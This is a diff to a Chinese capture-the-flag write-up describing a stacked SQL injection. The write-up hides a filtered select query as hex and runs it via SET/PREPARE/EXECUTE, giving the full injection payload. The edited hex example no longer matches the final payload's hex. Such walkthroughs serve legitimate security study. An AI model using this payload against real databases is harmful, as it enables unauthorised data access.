@@ -174,12 +174,12 @@ echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
 成功回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/8122d53a32c6179d396ce793725a8a9c.png)<br />注意没有回显flag，就类似于你更新了个东西但是没刷新，重新在文本框里面输入1提交即可回显flag。
 <a name="z4q8F"></a>
 ### 第二种解法 编码逃逸 绕过滤
-由于select被过滤，考虑使用编码进行绕过<br />使用select查询就很简单了<br />构造payload<br />`select *from where `1919810931114514``（注意这里使用反引号把这个数字包括住，md编辑器打不上去） <br />*号查询数据表里面的全部内容，这就是爆出flag的原理<br />进行16进制编码加密<br />`73656c656374202a2066726f6d206020313931393831303933313131343531342060`<br />最终payload：<br />`1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#`
+由于select被过滤，考虑使用编码进行绕过<br />使用select查询就很简单了<br />构造payload<br />`select *from where `1919810931114514``（注意这里使用反引号把这个数字包括住，md编辑器打不上去） <br />*号查询数据表里面的全部内容，这就是爆出flag的原理<br />进行16进制编码加密<br />`73656c6563742a66726f6d7768657265603139313938313039333131313435313460`<br />最终payload：<br />`1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#`
 > - prepare…from…是预处理语句，会进行编码转换。
 > - execute用来执行由SQLPrepare创建的SQL语句。
 > - SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。
 > - 0x就是把后面的编码格式转换成16进制编码格式
-> - 那么总体理解就是，使用SET方法给变量a赋值，给a变量赋的值就是select查询1919810931114514表的所有内容语句编码后的值，execsql方法执行来自a变量的值，prepare...from方法将执行后的编码变换成字符串格式，execute方法调用并执行execsql方法。
+> - 那么总体理解就是，使用SeT方法给变量a赋值，给a变量赋的值就是select查询1919810931114514表的所有内容语句编码后的值，execsql方法执行来自a变量的值，prepare...from方法将执行后的编码变换成字符串格式，execute方法调用并执行execsql方法。
 参考：https://blog.csdn.net/qq_44657899/article/details/10323914
 
 回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/d9511654ed16ddd5152c6598b5fecbde.png)
